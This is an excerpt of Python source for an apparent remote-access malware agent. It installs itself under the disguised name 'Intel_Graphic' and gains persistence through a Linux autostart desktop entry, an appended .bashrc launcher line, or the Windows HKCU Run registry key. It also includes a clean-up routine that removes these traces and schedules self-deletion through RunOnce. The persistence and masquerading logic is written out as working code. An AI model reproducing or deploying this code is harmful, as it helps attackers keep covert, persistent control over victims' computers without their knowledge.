...
class Agent(object):
    ...
    def get_install_dir(self):
        ...
        if platform.system() == 'Linux':
            install_dir = self.expand_path('~/.Intel_Graphic')
        elif platform.system() == 'Windows':
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'Intel_Graphic')
    ...
    def persist(self):
        ...
        if self.is_installed():
            ...
            return
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.Intel_Graphic')
            ...
            if os.path.exists(self.expand_path("~/.config/autostart/")):
                ...
                with open(self.expand_path('~/.config/autostart/Intel_Graphic.desktop'), 'w') as f:
                    f.write(desktop_entry)
            else:
                with open(self.expand_path("~/.bashrc"), "a") as f:
                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'Intel_Graphic')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v Intel_Graphic /t REG_SZ /d \"%s\"" % agent_path
    ...
    def clean(self):
        ...
        if platform.system() == 'Linux':
            ...
            desktop_entry = self.expand_path('~/.config/autostart/Intel_Graphic.desktop')
            if os.path.exists(desktop_entry):
                os.remove(desktop_entry)
            os.system("grep -v .Intel_Graphic .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'Intel_Graphic')
            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v Intel_Graphic"
            subprocess.Popen(cmd, shell=True)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v Intel_Graphic /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
            subprocess.Popen(cmd, shell=True)
